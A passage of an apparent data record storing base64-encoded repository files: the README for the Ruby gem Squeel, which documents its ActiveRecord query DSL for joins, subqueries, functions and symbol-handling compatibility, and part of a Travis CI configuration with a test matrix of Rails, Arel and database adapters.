T1IgImFydGljbGVzIi4iYm9keSIgTElLRSAnJWF3ZXNvbWUlJwojICAgICkp
CmBgYAoKT3IsIHlvdSBjYW4ganVzdCBtb2RpZnkgeW91ciBwcmV2aW91cyBz
Y29wZSwgY2hhbmdpbmcgYHdoZXJlYCB0byBgc3F1ZWVsYDoKCmBgYHJ1YnkK
ZGVmIHNlbGYudGl0bGVfb3JfYm9keV9jb250YWlucyhzdHJpbmcpCiAgc3F1
ZWVse3RpdGxlLm1hdGNoZXMoIiUje3N0cmluZ30lIikgfCBib2R5Lm1hdGNo
ZXMoIiUje3N0cmluZ30lIil9CmVuZApgYGAKCiMjIyBTdWJxdWVyaWVzCgpZ
b3UgY2FuIHN1cHBseSBhbiBgQWN0aXZlUmVjb3JkOjpSZWxhdGlvbmAgYXMg
YSB2YWx1ZSBmb3IgYSBwcmVkaWNhdGUgaW4gb3JkZXIgdG8gdXNlCmEgc3Vi
cXVlcnkuIFNvLCBmb3IgZXhhbXBsZToKCmBgYHJ1YnkKYXdlc29tZV9wZW9w
bGUgPSBQZXJzb24ud2hlcmV7YXdlc29tZSA9PSB0cnVlfQpBcnRpY2xlLndo
ZXJle2F1dGhvcl9pZC5pbihhd2Vzb21lX3Blb3BsZS5zZWxlY3R7aWR9KX0K
IyA9PiBTRUxFQ1QgImFydGljbGVzIi4qIEZST00gImFydGljbGVzIgojICAg
IFdIRVJFICJhcnRpY2xlcyIuImF1dGhvcl9pZCIgSU4gKFNFTEVDVCAicGVv
cGxlIi4iaWQiIEZST00gInBlb3BsZSIgIFdIRVJFICJwZW9wbGUiLiJhd2Vz
b21lIiA9ICd0JykKYGBgCgojIyMgSm9pbnMKClNxdWVlbCBhZGRzIGEgY291
cGxlIG9mIGVuaGFuY2VtZW50cyB0byBqb2lucy4gRmlyc3QsIGtleXBhdGhz
IGNhbiBiZSB1c2VkIGFzIHNob3J0aGFuZCBmb3IKbmVzdGVkIGFzc29jaWF0
aW9uIGpvaW5zLiBTZWNvbmQsIHlvdSBjYW4gc3BlY2lmeSBqb2luIHR5cGVz
IChpbm5lciBhbmQgb3V0ZXIpLCBhbmQgYSBjbGFzcwppbiB0aGUgY2FzZSBv
ZiBhIHBvbHltb3JwaGljIGJlbG9uZ3NfdG8gcmVsYXRpb25zaGlwLgoKYGBg
cnVieQpQZXJzb24uam9pbnN7YXJ0aWNsZXMub3V0ZXJ9CiMgPT4gU0VMRUNU
ICJwZW9wbGUiLiogRlJPTSAicGVvcGxlIgojICAgIExFRlQgT1VURVIgSk9J
TiAiYXJ0aWNsZXMiIE9OICJhcnRpY2xlcyIuInBlcnNvbl9pZCIgPSAicGVv
cGxlIi4iaWQiCk5vdGUuam9pbnN7bm90YWJsZShQZXJzb24pLm91dGVyfQoj
ID0+IFNFTEVDVCAibm90ZXMiLiogRlJPTSAibm90ZXMiCiMgICAgTEVGVCBP
VVRFUiBKT0lOICJwZW9wbGUiCiMgICAgICBPTiAicGVvcGxlIi4iaWQiID0g
Im5vdGVzIi4ibm90YWJsZV9pZCIKIyAgICAgIEFORCAibm90ZXMiLiJub3Rh
YmxlX3R5cGUiID0gJ1BlcnNvbicKYGBgCgpUaGVzZSBjYW4gYWxzbyBiZSB1
c2VkIGluc2lkZSBrZXlwYXRoczoKCmBgYHJ1YnkKTm90ZS5qb2luc3tub3Rh
YmxlKFBlcnNvbikuYXJ0aWNsZXN9CiMgPT4gU0VMRUNUICJub3RlcyIuKiBG
Uk9NICJub3RlcyIKIyAgICBJTk5FUiBKT0lOICJwZW9wbGUiIE9OICJwZW9w
bGUiLiJpZCIgPSAibm90ZXMiLiJub3RhYmxlX2lkIgojICAgICAgQU5EICJu
b3RlcyIuIm5vdGFibGVfdHlwZSIgPSAnUGVyc29uJwojICAgIElOTkVSIEpP
SU4gImFydGljbGVzIiBPTiAiYXJ0aWNsZXMiLiJwZXJzb25faWQiID0gInBl
b3BsZSIuImlkIgpgYGAKCllvdSBjYW4gcmVmZXIgdG8gdGhlc2UgYXNzb2Np
YXRpb25zIHdoZW4gY29uc3RydWN0aW5nIG90aGVyIHBhcnRzIG9mIHlvdXIg
cXVlcnksIGFuZAp0aGV5J2xsIGJlIGF1dG9tYXRpY2FsbHkgbWFwcGVkIHRv
IHRoZSBwcm9wZXIgdGFibGUgb3IgdGFibGUgYWxpYXMgVGhpcyBpcyBtb3N0
IG5vdGljZWFibGUKd2hlbiB1c2luZyBzZWxmLXJlZmVyZW50aWFsIGFzc29j
aWF0aW9uczoKCmBgYHJ1YnkKUGVyc29uLmpvaW5ze2NoaWxkcmVuLnBhcmVu
dC5jaGlsZHJlbn0uCiAgICAgICB3aGVyZXsKICAgICAgICAgKGNoaWxkcmVu
Lm5hbWUubGlrZSAnRXJuaWUlJykgfAogICAgICAgICAoY2hpbGRyZW4ucGFy
ZW50Lm5hbWUubGlrZSAnRXJuaWUlJykgfAogICAgICAgICAoY2hpbGRyZW4u
cGFyZW50LmNoaWxkcmVuLm5hbWUubGlrZSAnRXJuaWUlJykKICAgICAgIH0K
IyA9PiBTRUxFQ1QgInBlb3BsZSIuKiBGUk9NICJwZW9wbGUiCiMgICAgSU5O
RVIgSk9JTiAicGVvcGxlIiAiY2hpbGRyZW5fcGVvcGxlIiBPTiAiY2hpbGRy
ZW5fcGVvcGxlIi4icGFyZW50X2lkIiA9ICJwZW9wbGUiLiJpZCIKIyAgICBJ
Tk5FUiBKT0lOICJwZW9wbGUiICJwYXJlbnRzX3Blb3BsZSIgT04gInBhcmVu
dHNfcGVvcGxlIi4iaWQiID0gImNoaWxkcmVuX3Blb3BsZSIuInBhcmVudF9p
ZCIKIyAgICBJTk5FUiBKT0lOICJwZW9wbGUiICJjaGlsZHJlbl9wZW9wbGVf
MiIgT04gImNoaWxkcmVuX3Blb3BsZV8yIi4icGFyZW50X2lkIiA9ICJwYXJl
bnRzX3Blb3BsZSIuImlkIgojICAgIFdIRVJFICgoKCJjaGlsZHJlbl9wZW9w
bGUiLiJuYW1lIiBMSUtFICdFcm5pZSUnCiMgICAgICAgICAgT1IgInBhcmVu
dHNfcGVvcGxlIi4ibmFtZSIgTElLRSAnRXJuaWUlJykKIyAgICAgICAgICBP
UiAiY2hpbGRyZW5fcGVvcGxlXzIiLiJuYW1lIiBMSUtFICdFcm5pZSUnKSkK
YGBgCgpLZXlwYXRocyB3ZXJlIHVzZWQgaGVyZSBmb3IgY2xhcml0eSwgYnV0
IG5lc3RlZCBoYXNoZXMgd291bGQgd29yayBqdXN0IGFzIHdlbGwuCgpZb3Ug
Y2FuIGFsc28gdXNlIGEgc3VicXVlcnkgaW4gYSBqb2luLgoKTm90aWNlOgox
LiBTcXVlZWwgY2FuIG9ubHkgYWNjZXB0IGFuIEFjdGl2ZVJlY29yZDo6UmVs
YXRpb24gY2xhc3Mgb2Ygc3VicXVlcmllcyBpbiBhIGpvaW4uCjIuIFVzZSB0
aGUgY2hhaW4gd2l0aCBjYXV0aW9uLiBZb3Ugc2hvdWxkIGNhbGwgYGFzYCBm
aXJzdCB0byBnZXQgYSBOb2Rlczo6QXMsIHRoZW4gY2FsbCBgb25gIHRvIGdl
dCBhIGpvaW4gbm9kZS4KCmBgYHJ1YnkKc3VicXVlcnkgPSBPcmRlckl0ZW0u
Z3JvdXAoOm9yZGVyYWJsZV9pZCkuc2VsZWN0IHsgW29yZGVyYWJsZV9pZCwg
c3VtKHF1YW50aXR5ICogdW5pdF9wcmljZSkuYXMoYW1vdW50KV0gfQpTZWF0
LmpvaW5zIHsgW3BheW1lbnQub3V0ZXIsIHN1YnF1ZXJ5LmFzKCdzZWF0X29y
ZGVyX2l0ZW1zJykub24geyBpZCA9PSBzZWF0X29yZGVyX2l0ZW1zLm9yZGVy
YWJsZV9pZH0ub3V0ZXJdIH0uCiAgICAgICAgICAgICAgc2VsZWN0IHsgW3Nl
YXRfb3JkZXJfaXRlbXMuYW1vdW50LCAic2VhdHMuKiJdIH0KIyA9PiBTRUxF
Q1QgInNlYXRfb3JkZXJfaXRlbXMiLiJhbW91bnQiLCBzZWF0cy4qCiMgICAg
RlJPTSAic2VhdHMiCiMgICAgTEVGVCBPVVRFUiBKT0lOICJwYXltZW50cyIg
T04gInBheW1lbnRzIi4iaWQiID0gInNlYXRzIi4icGF5bWVudF9pZCIKIyAg
ICBMRUZUIE9VVEVSIEpPSU4gKAojICAgICAgU0VMRUNUICJvcmRlcl9pdGVt
cyIuIm9yZGVyYWJsZV9pZCIsCiMgICAgICAgICAgICAgc3VtKCJvcmRlcl9p
dGVtcyIuInF1YW50aXR5IiAqICJvcmRlcl9pdGVtcyIuInVuaXRfcHJpY2Ui
KSBBUyBhbW91bnQKIyAgICAgIEZST00gIm9yZGVyX2l0ZW1zIgojICAgICAg
R1JPVVAgQlkgIm9yZGVyX2l0ZW1zIi4ib3JkZXJhYmxlX2lkIgojICAgICkg
c2VhdF9vcmRlcl9pdGVtcyBPTiAic2VhdHMiLiJpZCIgPSAic2VhdF9vcmRl
cl9pdGVtcyIuIm9yZGVyYWJsZV9pZCIKYGBgCgojIyMgSW5jbHVkZXMKCklu
Y2x1ZGVzIHdvcmtzIHNpbWlsYXJseSB3aXRoIGpvaW5zLCBpdCB1c2VzIG91
dGVyIGpvaW4gZGVmYXVsdGx5LiBJbiBSYWlscyA0LAp5b3UgbmVlZCB0byB1
c2UgYHJlZmVyZW5jZXNgIHdpdGggYGluY2x1ZGVzYCB0b2dldGhlci4KCiMj
IyMgUmFpbHMgNCsKCmBgYHJ1YnkKUGVyc29uLmluY2x1ZGVzKDphcnRpY2xl
cyA9PiB7OmNvbW1lbnRzID0+IDpwZXJzb259KS5yZWZlcmVuY2VzKDphbGwp
CiMgPT4gU0VMRUNUICJwZW9wbGUiLiogRlJPTSAicGVvcGxlIgojICAgIExF
RlQgT1VURVIgSk9JTiAiYXJ0aWNsZXMiIE9OICJhcnRpY2xlcyIuInBlcnNv
bl9pZCIgPSAicGVvcGxlIi4iaWQiCiMgICAgTEVGVCBPVVRFUiBKT0lOICJj
b21tZW50cyIgT04gImNvbW1lbnRzIi4iYXJ0aWNsZV9pZCIgPSAiYXJ0aWNs
ZXMiLiJpZCIKIyAgICBMRUZUIE9VVEVSIEpPSU4gInBlb3BsZSIgInBlb3Bs
ZV9jb21tZW50cyIgT04gInBlb3BsZV9jb21tZW50cyIuImlkIiA9ICJjb21t
ZW50cyIuInBlcnNvbl9pZCIKYGBgCgpXaXRoIGEga2V5cGF0aCwgdGhpcyB3
b3VsZCBsb29rIGxpa2U6CgpgYGBydWJ5ClBlcnNvbi5pbmNsdWRlc3thcnRp
Y2xlcy5jb21tZW50cy5wZXJzb259LnJlZmVyZW5jZXMoOmFsbCkKYGBgCgoj
IyMjIFJhaWxzIDMueAoKYGBgcnVieQpQZXJzb24uaW5jbHVkZXMoOmFydGlj
bGVzID0+IHs6Y29tbWVudHMgPT4gOnBlcnNvbn0pCiMgPT4gU0VMRUNUICJw
ZW9wbGUiLiogRlJPTSAicGVvcGxlIgojICAgIExFRlQgT1VURVIgSk9JTiAi
YXJ0aWNsZXMiIE9OICJhcnRpY2xlcyIuInBlcnNvbl9pZCIgPSAicGVvcGxl
Ii4iaWQiCiMgICAgTEVGVCBPVVRFUiBKT0lOICJjb21tZW50cyIgT04gImNv
bW1lbnRzIi4iYXJ0aWNsZV9pZCIgPSAiYXJ0aWNsZXMiLiJpZCIKIyAgICBM
RUZUIE9VVEVSIEpPSU4gInBlb3BsZSIgInBlb3BsZV9jb21tZW50cyIgT04g
InBlb3BsZV9jb21tZW50cyIuImlkIiA9ICJjb21tZW50cyIuInBlcnNvbl9p
ZCIKYGBgCgpXaXRoIGEga2V5cGF0aCwgdGhpcyB3b3VsZCBsb29rIGxpa2U6
CgpgYGBydWJ5ClBlcnNvbi5pbmNsdWRlc3thcnRpY2xlcy5jb21tZW50cy5w
ZXJzb259CmBgYAoKIyMjIEZ1bmN0aW9ucwoKWW91IGNhbiBjYWxsIFNRTCBm
dW5jdGlvbnMganVzdCBsaWtlIHlvdSB3b3VsZCBjYWxsIGEgbWV0aG9kIGlu
IFJ1YnkuLi4KCmBgYHJ1YnkKUGVyc29uLnNlbGVjdHtjb2FsZXNjZShuYW1l
LCAnPG5vIG5hbWUgZ2l2ZW4+Jyl9CiMgPT4gU0VMRUNUIGNvYWxlc2NlKCJw
ZW9wbGUiLiJuYW1lIiwgJzxubyBuYW1lIGdpdmVuPicpIEZST00gInBlb3Bs
ZSIKYGBgCgouLi5hbmQgeW91IGNhbiBlYXNpbHkgZ2l2ZSBpdCBhbiBhbGlh
czoKCmBgYHJ1YnkKcGVyc29uID0gUGVyc29uLnNlbGVjdHsKICBjb2FsZXNj
ZShuYW1lLCAnPG5vIG5hbWUgZ2l2ZW4+JykuYXMobmFtZV93aXRoX2RlZmF1
bHQpCn0uZmlyc3QKcGVyc29uLm5hbWVfd2l0aF9kZWZhdWx0ICMgbmFtZSBv
ciA8bm8gbmFtZSBnaXZlbj4sIGRlcGVuZGluZyBvbiBkYXRhCmBgYAoKV2hl
biB5b3UgdXNlIGEgc3R1Yiwgc3ltYm9sLCBvciBrZXlwYXRoIGluc2lkZSBh
IGZ1bmN0aW9uIGNhbGwsIGl0J2xsIGJlIGludGVycHJldGVkIHJlbGF0aXZl
IHRvCml0cyBwbGFjZSBpbnNpZGUgYW55IG5lc3RlZCBhc3NvY2lhdGlvbnM6
CgpgYGBydWJ5ClBlcnNvbi5qb2luc3thcnRpY2xlc30uZ3JvdXB7YXJ0aWNs
ZXMudGl0bGV9LmhhdmluZ3t7YXJ0aWNsZXMgPT4ge21heChpZCkgPT4gaWR9
fX0KIyA9PiBTRUxFQ1QgInBlb3BsZSIuKiBGUk9NICJwZW9wbGUiCiMgICAg
SU5ORVIgSk9JTiAiYXJ0aWNsZXMiIE9OICJhcnRpY2xlcyIuInBlcnNvbl9p
ZCIgPSAicGVvcGxlIi4iaWQiCiMgICAgR1JPVVAgQlkgImFydGljbGVzIi4i
dGl0bGUiCiMgICAgSEFWSU5HIG1heCgiYXJ0aWNsZXMiLiJpZCIpID0gImFy
dGljbGVzIi4iaWQiCmBgYAoKSWYgeW91IHdhbnQgdG8gdXNlIGFuIGF0dHJp
YnV0ZSBmcm9tIGEgZGlmZmVyZW50IGJyYW5jaCBvZiB0aGUgaGllcmFyY2h5
LCB1c2UgYW4gYWJzb2x1dGUKa2V5cGF0aCAofikgYXMgZG9uZSBoZXJlOgoK
YGBgcnVieQpQZXJzb24uam9pbnN7YXJ0aWNsZXN9Lmdyb3Vwe2FydGljbGVz
LnRpdGxlfS5oYXZpbmd7e2FydGljbGVzID0+IHttYXgofmlkKSA9PiBpZH19
fQojID0+IFNFTEVDVCAicGVvcGxlIi4qIEZST00gInBlb3BsZSIKIyAgICBJ
Tk5FUiBKT0lOICJhcnRpY2xlcyIgT04gImFydGljbGVzIi4icGVyc29uX2lk
IiA9ICJwZW9wbGUiLiJpZCIKIyAgICBHUk9VUCBCWSAiYXJ0aWNsZXMiLiJ0
aXRsZSIKIyAgICBIQVZJTkcgbWF4KCJwZW9wbGUiLiJpZCIpID0gImFydGlj
bGVzIi4iaWQiCmBgYAoKIyMjIFNRTCBPcGVyYXRvcnMKCllvdSBjYW4gdXNl
IHRoZSBzdGFuZGFyZCBtYXRoZW1hdGljYWwgb3BlcmF0b3JzIChgK2AsIGAt
YCwgYCpgLCBgL2ApIGluc2lkZSB0aGUgU3F1ZWVsIERTTCB0bwpzcGVjaWZ5
IG9wZXJhdG9ycyBpbiB0aGUgcmVzdWx0aW5nIFNRTCwgb3IgdGhlIGBvcGAg
bWV0aG9kIHRvIHNwZWNpZnkgYW5vdGhlcgpjdXN0b20gb3BlcmF0b3IsIHN1
Y2ggYXMgdGhlIHN0YW5kYXJkIFNRTCBjb25jYXRlbmF0aW9uIG9wZXJhdG9y
LCBgfHxgOgoKYGBgcnVieQpwID0gUGVyc29uLnNlbGVjdHtuYW1lLm9wKCd8
fCcsICctZGlkZGx5JykuYXMoZmxhbmRlcml6ZWRfbmFtZSl9LmZpcnN0CnAu
ZmxhbmRlcml6ZWRfbmFtZQojID0+ICJBcmljIFNtaXRoLWRpZGRseSIKYGBg
CgpBcyB5b3UgY2FuIHNlZSwganVzdCBsaWtlIGZ1bmN0aW9ucywgdGhlc2Ug
b3BlcmF0aW9ucyBjYW4gYmUgZ2l2ZW4gYWxpYXNlcy4KClRvIHNlbGVjdCBt
b3JlIHRoYW4gb25lIGF0dHJpYnV0ZSAob3IgY2FsY3VsYXRlZCBhdHRyaWJ1
dGUpIHNpbXBseSBwdXQgdGhlbSBpbnRvIGFuIGFycmF5OgoKYGBgcnVieQpw
ID0gUGVyc29uLnNlbGVjdHtbIG5hbWUub3AoJ3x8JywgJy1kaWRkbHknKS5h
cyhmbGFuZGVyaXplZF9uYW1lKSwKICAgICAgICAgICAgICAgICAgICBjb2Fs
ZXNjZShuYW1lLCAnPG5vIG5hbWUgZ2l2ZW4+JykuYXMobmFtZV93aXRoX2Rl
ZmF1bHQpIF19LmZpcnN0CnAuZmxhbmRlcml6ZWRfbmFtZQojID0+ICJBcmlj
IFNtaXRoLWRpZGRseSIKcC5uYW1lX3dpdGhfZGVmYXVsdAojID0+ICJBcmlj
IFNtaXRoIgpgYGAKCgojIyBDb21wYXRpYmlsaXR5IHdpdGggQWN0aXZlIFJl
Y29yZAoKTW9zdCBvZiB0aGUgbmV3IGZ1bmN0aW9uYWxpdHkgcHJvdmlkZWQg
YnkgU3F1ZWVsIGlzIGFjY2Vzc2VkIHdpdGggdGhlIG5ldyBibG9jay1zdHls
ZSBgd2hlcmV7fWAKc3ludGF4LgoKQWxsIHlvdXIgZXhpc3RpbmcgY29kZSB0
aGF0IHVzZXMgcGxhaW4gQWN0aXZlIFJlY29yZCBgd2hlcmUoKWAgcXVlcmll
cyBzaG91bGQgY29udGludWUgdG8gd29yayB0aGUKc2FtZSBhZnRlciBhZGRp
bmcgU3F1ZWVsIHRvIHlvdXIgcHJvamVjdCB3aXRoIG9uZSBleGNlcHRpb246
IHN5bWJvbHMgYXMgdGhlIHZhbHVlIHNpZGUgb2YgYQpjb25kaXRpb24gKGlu
IG5vcm1hbCBgd2hlcmUoKWAgY2xhdXNlcykuCgojIyMgU3ltYm9scyBhcyB0
aGUgdmFsdWUgc2lkZSBvZiBhIGNvbmRpdGlvbiAoaW4gbm9ybWFsIGB3aGVy
ZSgpYCBjbGF1c2VzKQoKSWYgeW91IGhhdmUgYW55IGB3aGVyZSgpYCBjbGF1
c2VzIHRoYXQgdXNlIGEgc3ltYm9sIGFzIHRoZSB2YWx1ZSBzaWRlCihyaWdo
dC1oYW5kIHNpZGUpIG9mIGEgY29uZGl0aW9uLCAqKnlvdSB3aWxsIG5lZWQg
dG8gY2hhbmdlIHRoZSBzeW1ib2wgaW50byBhCnN0cmluZyBpbiBvcmRlciBm
b3IgaXQgdG8gY29udGludWUgdG8gYmUgdHJlYXRlZCBhcyBhIHZhbHVlKiou
CgpTcXVlZWwgY2hhbmdlcyB0aGUgbWVhbmluZyBvZiBzeW1ib2xzIGluIHRo
ZSB2YWx1ZSBvZiBhIGNvbmRpdGlvbiB0byByZWZlciB0bwp0aGUgbmFtZSBv
ZiBhICoqY29sdW1uKiogaW5zdGVhZCBvZiBzaW1wbHkgdHJlYXRpbmcgdGhl
IHN5bWJvbCBhcyBhICoqc3RyaW5nIGxpdGVyYWwqKi4KCkZvciBleGFtcGxl
LCB0aGlzIHF1ZXJ5OgoKYGBgcnVieQpQZXJzb24ud2hlcmUoOmZpcnN0X25h
bWUgPT4gOmxhc3RfbmFtZSkKYGBgCgpwcm9kdWNlcyB0aGlzIFNRTCBxdWVy
eSBpbiBwbGFpbiBBY3RpdmUgUmVjb3JkOgoKYGBgc3FsClNFTEVDVCBwZW9w
bGUuKiBGUk9NIHBlb3BsZSBXSEVSRSBwZW9wbGUuZmlyc3RfbmFtZSA9ICds
YXN0X25hbWUnLgpgYGAKCmJ1dCBwcm9kdWNlcyB0aGlzIFNRTCBxdWVyeSBp
ZiB5b3UgYXJlIHVzaW5nIFNxdWVlbDoKCmBgYHNxbApTRUxFQ1QgcGVvcGxl
LiogRlJPTSBwZW9wbGUgV0hFUkUgcGVvcGxlLmZpcnN0X25hbWUgPSBwZW9w
bGUubGFzdF9uYW1lCmBgYAoKTm90ZSB0aGF0IHRoaXMgbmV3IGJlaGF2aW9y
IGFwcGxpZXMgdG8gdGhlIHBsYWluIGB3aGVyZSgpYC1zdHlsZSBleHByZXNz
aW9ucyBpbiBhZGRpdGlvbiB0byB0aGUgbmV3CmB3aGVyZXt9YCBTcXVlZWwg
c3R5bGUuCgpJbiBvcmRlciBmb3IgeW91ciBleGlzdGluZyAgYHdoZXJlKClg
IGNsYXVzZXMgd2l0aCBzeW1ib2xzIHRvIGNvbnRpbnVlIHRvIGJlaGF2ZSB0
aGUgc2FtZSwgeW91CioqbXVzdCoqIGNoYW5nZSB0aGUgc3ltYm9scyBpbnRv
IHN0cmluZ3MuIFRoZXNlIHNjb3BlcywgZm9yIGV4YW1wbGU6CgpgYGBydWJ5
CnNjb3BlIDphY3RpdmUsIHdoZXJlKDpzdGF0ZSA9PiA6YWN0aXZlKQpzY29w
ZSA6aW5fc3RhdGUsIGxhbWJkYSB7fHN0YXRlfCB3aGVyZSg6c3RhdGUgPT4g
c3RhdGUpIH0KYGBgCgpzaG91bGQgYmUgY2hhbmdlZCB0byB0aGlzOgoKYGBg
cnVieQpzY29wZSA6YWN0aXZlLCB3aGVyZSg6c3RhdGUgPT4gJ2FjdGl2ZScp
CnNjb3BlIDppbl9zdGF0ZSwgbGFtYmRhIHt8c3RhdGV8IHdoZXJlKDpzdGF0
ZSA9PiBzdGF0ZS50b19zKSB9CmBgYAoKRm9yIGZ1cnRoZXIgaW5mb3JtYXRp
b24sIHNlZQpbdGhpcyBwb3N0IHRvIHRoZSBSYWlscyBsaXN0XShodHRwczov
L2dyb3Vwcy5nb29nbGUuY29tL2ZvcnVtLz9mcm9tZ3JvdXBzPSMhdG9waWMv
cnVieW9ucmFpbHMtY29yZS9OUUpKelo3UjdTMCksClt0aGlzIGNvbW1pdF0o
aHR0cHM6Ly9naXRodWIuY29tL2xpZm8vZG9jcmFpbHMvY29tbWl0LzUwYzUw
MDViYWZlN2U0M2Y4MWExNDFjZDJjNTEyMzc5YWVjNzQzMjUpIHRvCnRoZSBb
QWN0aXZlIFJlY29yZCBndWlkZXNdKGh0dHA6Ly9lZGdlZ3VpZGVzLnJ1Ynlv
bnJhaWxzLm9yZy9hY3RpdmVfcmVjb3JkX3F1ZXJ5aW5nLmh0bWwjaGFzaC1j
b25kaXRpb25zKSwKWyM2N10oaHR0cHM6Ly9naXRodWIuY29tL2FjdGl2ZXJl
Y29yZC1oYWNrZXJ5L3NxdWVlbC9pc3N1ZXMvNjcpLApbIzc1XShodHRwczov
L2dpdGh1Yi5jb20vYWN0aXZlcmVjb3JkLWhhY2tlcnkvc3F1ZWVsL2lzc3Vl
cy83NSksIGFuZApbIzE3MV0oaHR0cHM6Ly9naXRodWIuY29tL2FjdGl2ZXJl
Y29yZC1oYWNrZXJ5L3NxdWVlbC9pc3N1ZXMvMTcxKS4KCiMjIENvbXBhdGli
aWxpdHkgd2l0aCBNZXRhV2hlcmUKCldoaWxlIHRoZSBTcXVlZWwgRFNMIGlz
IHRoZSBwcmVmZXJyZWQgd2F5IHRvIGFjY2VzcyBhZHZhbmNlZCBxdWVyeSBm
dW5jdGlvbmFsaXR5LCB5b3UgY2FuCnN0aWxsIGVuYWJsZSBtZXRob2RzIG9u
IHN5bWJvbHMgdG8gYWNjZXNzIEFyZWwgcHJlZGljYXRpb25zIGluIGEgc2lt
aWxhciBtYW5uZXIgdG8gTWV0YVdoZXJlOgoKYGBgcnVieQpTcXVlZWwuY29u
ZmlndXJlIGRvIHxjb25maWd8CiAgY29uZmlnLmxvYWRfY29yZV9leHRlbnNp
b25zIDpzeW1ib2wKZW5kCmBgYApgYGBydWJ5ClBlcnNvbi5qb2lucyg6YXJ0
aWNsZXMgPT4gOmNvbW1lbnRzKS4KICAgICAgIHdoZXJlKDphcnRpY2xlcyA9
PiB7OmNvbW1lbnRzID0+IHs6Ym9keS5tYXRjaGVzID0+ICdIZWxsbyEnfX0p
CiMgPT4gU0VMRUNUICJwZW9wbGUiLiogRlJPTSAicGVvcGxlIgojICAgIElO
TkVSIEpPSU4gImFydGljbGVzIiBPTiAiYXJ0aWNsZXMiLiJwZXJzb25faWQi
ID0gInBlb3BsZSIuImlkIgojICAgIElOTkVSIEpPSU4gImNvbW1lbnRzIiBP
TiAiY29tbWVudHMiLiJhcnRpY2xlX2lkIiA9ICJhcnRpY2xlcyIuImlkIgoj
ICAgIFdIRVJFICJjb21tZW50cyIuImJvZHkiIExJS0UgJ0hlbGxvIScKYGBg
CgpUaGlzIHNob3VsZCBoZWxwIHRvIHNtb290aCBvdmVyIHRoZSB0cmFuc2l0
aW9uIHRvIHRoZSBuZXcgRFNMLgoKIyMgQ29udHJpYnV0aW9ucwoKSWYgeW91
J2QgbGlrZSB0byBzdXBwb3J0IHRoZSBjb250aW51ZWQgZGV2ZWxvcG1lbnQg
b2YgU3F1ZWVsLCBwbGVhc2UgY29uc2lkZXIKW21ha2luZyBhIGRvbmF0aW9u
XShodHRwczovL3d3dy5wYXlwYWwuY29tL2NnaS1iaW4vd2Vic2NyP2NtZD1f
cy14Y2xpY2smaG9zdGVkX2J1dHRvbl9pZD1ON1FQNU4zVUI3Nk1FKS4KClRv
IHN1cHBvcnQgdGhlIHByb2plY3QgaW4gb3RoZXIgd2F5czoKCiogVXNlIFNx
dWVlbCBpbiB5b3VyIGFwcHMsIGFuZCBsZXQgbWUga25vdyBpZiB5b3UgZW5j
b3VudGVyIGFueXRoaW5nIHRoYXQncyBicm9rZW4gb3IgbWlzc2luZy4KICBB
IGZhaWxpbmcgc3BlYyBpcyBhd2Vzb21lLiBBIHB1bGwgcmVxdWVzdCBpcyBl
dmVuIGJldHRlciEKKiBTcHJlYWQgdGhlIHdvcmQgb24gVHdpdHRlciwgRmFj
ZWJvb2ssIGFuZCBlbHNld2hlcmUgaWYgU3F1ZWVsJ3MgYmVlbiB1c2VmdWwg
dG8geW91LiBUaGUgbW9yZQogIHBlb3BsZSB3aG8gYXJlIHVzaW5nIHRoZSBw
cm9qZWN0LCB0aGUgcXVpY2tlciB3ZSBjYW4gZmluZCBhbmQgZml4IGJ1Z3Mh
CgojIyBDb3B5cmlnaHQKCkNvcHlyaWdodCAmY29weTsgMjAxMSBbRXJuaWUg
TWlsbGVyXShodHRwOi8vdHdpdHRlci5jb20vZXJuaWVtaWxsZXIpCg==
",,"YmVmb3JlX3NjcmlwdDoKICAtIG15c3FsIC1lICJjcmVhdGUgZGF0YWJhc2Ug
c3F1ZWVsX3Rlc3RfZXhhbXBsZXM7IgogIC0gcHNxbCAtYyAiY3JlYXRlIGRh
dGFiYXNlIHNxdWVlbF90ZXN0X2V4YW1wbGVzOyIgLVUgcG9zdGdyZXMKCnNj
cmlwdDoKICAtIGJ1bmRsZSBleGVjIHJha2UgdGVzdDokQURBUFRFUgoKcnZt
OgogIC0gMS45LjMKICAtIDIuMC4wCiAgLSAyLjEuNQoKZW52OgogIGdsb2Jh
bDoKICAgIC0gU1FfQ09ORklHX0ZJTEU9JFRSQVZJU19CVUlMRF9ESVIvc3Bl
Yy9jb25maWcudHJhdmlzLnltbAogIG1hdHJpeDoKICAgIC0gUkFJTFM9NC0y
LXN0YWJsZSBBUkVMPTYtMC1zdGFibGUgQURBUFRFUj1zcWxpdGUzCiAgICAt
IFJBSUxTPTQtMS1zdGFibGUgQVJFTD01LTAtc3RhYmxlIEFEQVBURVI9c3Fs
aXRlMwogICAgLSBSQUlMUz00LTAtc3RhYmxlIEFSRUw9NC0wLXN0YWJsZSBB
REFQVEVSPXNxbGl0ZTMKICAgIC0gUkFJTFM9My0yLXN0YWJsZSBBUkVMPTMt
MC1zdGFibGUgQURBUFRFUj1zcWxpdGUzCiAgICAtIFJBSUxTPTMtMS1zdGFi
bGUgQVJFTD0yLTItc3RhYmxlIEFEQVBURVI9c3FsaXRlMwogICAgLSBSQUlM
Uz0zLTAtc3RhYmxlIEFSRUw9Mi0wLXN0YWJsZSBBREFQVEVSPXNxbGl0ZTMK
ICAgIC0gUkFJTFM9NC0yLXN0YWJsZSBBUkVMPTYtMC1zdGFibGUgQURBUFRF
Uj1teXNxbAogICAgLSBSQUlMUz00LTEtc3RhYmxlIEFSRUw9NS0wLXN0YWJs
ZSBBREFQVEVSPW15c3FsCiAgICAtIFJBSUxTPTQtMC1zdGFibGUgQVJFTD00
LTAtc3RhYmxlIEFEQVBURVI9bXlzcWwKICAgIC0gUkFJTFM9My0yLXN0YWJs
ZSBBUkVMPTMtMC1zdGFibGUgQURBUFRFUj1teXNxbAogICAgLSBSQUlMUz0z
LTEtc3RhYmxlIEFSRUw9Mi0yLXN0YWJsZSBBREFQVEVSPW15c3FsCiAgICAt
IFJBSUxTPTMtMC1zdGFibGUgQVJFTD0yLTAtc3RhYmxlIEFEQVBURVI9bXlz
cWwKICAgIC0gUkFJTFM9NC0yLXN0YWJsZSBBUkVMPTYtMC1zdGFibGUgQURB
UFRFUj1teXNxbDIKICAgIC0gUkFJTFM9NC0xLXN0YWJsZSBBUkVMPTUtMC1z
dGFibGUgQURBUFRFUj1teXNxbDIKICAgIC0gUkFJTFM9NC0wLXN0YWJsZSBB
UkVMPTQtMC1zdGFibGUgQURBUFRFUj1teXNxbDIKICAgIC0gUkFJTFM9My0y
LXN0YWJsZSBBUkVMPTMtMC1zdGFibGUgQURBUFRFUj1teXNxbDIKICAgIC0g
